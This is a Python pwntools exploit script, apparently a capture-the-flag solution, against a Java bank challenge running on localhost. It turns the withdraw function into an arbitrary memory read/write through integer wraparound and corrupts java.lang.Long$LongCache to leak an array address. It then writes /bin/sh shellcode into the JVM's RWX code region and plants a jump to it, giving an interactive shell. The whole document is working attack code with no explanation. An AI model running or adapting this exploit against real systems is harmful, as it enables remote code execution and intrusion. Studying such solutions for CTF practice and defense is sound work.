from pwn import *

context.arch = "amd64"

if args.REMOTE:
    p = remote("localhost", 7010)
else:
    from os import chdir
    chdir("src")
    cmd = "java Challenge"
    p = process(cmd, shell=True)

def login(bank, name):
    p.sendline(b"1")
    p.sendline(bank)
    p.sendline(name)
    p.recvuntil(b"ID ")
    return int(p.recvuntil(b"!", drop=True).decode())

def read(i):
    p.sendline(b"1")
    p.sendline(str(i).encode())
    p.recvuntil(b" $")
    v = int(p.recvlineS())
    return v

def get_block(i):
    return p64(read(i), sign="signed")

LONG_MAX = 2 ** 63 - 1
ULONG_MAX = 2 ** 64 - 1

def withdraw(i, x):
    p.sendline(b"2")
    p.sendline(str(i).encode())
    p.sendline(str(x).encode())

def write(i, target, check=True):
    old = read(i)
    d = (old - target) % ULONG_MAX
    q, r = divmod(d, LONG_MAX)
    for _ in range(q):
        withdraw(i, LONG_MAX)
    withdraw(i, r)
    # I can't do math lmao
    if check:
        if read(i) != target:
            withdraw(i, 1)

login(b"RegularBank", b"me")

p.sendline(b"2")
write(0, LONG_MAX)
p.sendline(b"3")

# upgrade
p.sendline(b"3")

login(b"java.lang.Long$LongCache", b"cache")

p.sendline(b"2")
write(128 + 10, LONG_MAX)
p.sendline(b"3")

leaked_hash = login(b"BlazinglyFastBank", b"notMeEither")
needle = p32(leaked_hash)

p.sendline(b"2")

base_index = 549
n = 1
for i in range(base_index, base_index + n):
    block = get_block(i)
    if needle in block:
        next_block = get_block(i + 1)
        arr_obj_base = u32(next_block[4:8])
        break

arr_elems_base = arr_obj_base + 16
def addr_to_index(a):
    return (a - arr_elems_base) // 8

rwx_base = 0x800000000
free = 0x1f60
free_rwx_base = rwx_base + free

def get_ints(unpadded_payload):
    def next_8(x):
        return ((x + 8 - 1) // 8) * 8;
    n = len(unpadded_payload)
    padding = (next_8(n) - n) * b"A"
    payload = unpadded_payload + padding
    return [u64(payload[i:i + 8], sign="signed") for i in range(0, n, 8)]

jump = f"""
movabs r10, {free_rwx_base}
"""

shellcode_ints = get_ints(asm(shellcraft.sh()))
jump_int = get_ints(asm(jump)[:8])[0]

shellcode_base_index = addr_to_index(free_rwx_base)
jump_index = addr_to_index(rwx_base)

for i, s in enumerate(shellcode_ints):
    write(shellcode_base_index + i, s)

write(jump_index, jump_int, check=False)

p.interactive()
